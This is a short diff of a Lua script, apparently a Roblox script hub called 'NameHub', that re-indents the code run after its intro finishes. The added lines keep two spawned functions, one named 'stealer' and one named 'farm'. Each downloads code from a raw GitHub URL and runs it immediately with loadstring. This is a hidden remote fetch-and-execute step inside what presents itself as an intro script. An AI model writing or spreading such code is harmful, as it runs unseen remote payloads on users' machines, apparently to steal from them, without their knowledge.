@@ -191,13 +191,15 @@ local introFinished = playIntro()
 
 if introFinished then
     print("NameHub intro has completed successfully")
+    
     local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHub/refs/heads/main/NameHub", true))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/be/refs/heads/main/u"))()
-end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHub/refs/heads/main/NameHub", true))()
+    end
 
-task.spawn(stealer)
-task.spawn(farm)
+    local function farm()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/be/refs/heads/main/u", true))()
+    end
+    
+    task.spawn(stealer)
+    task.spawn(farm)
 end
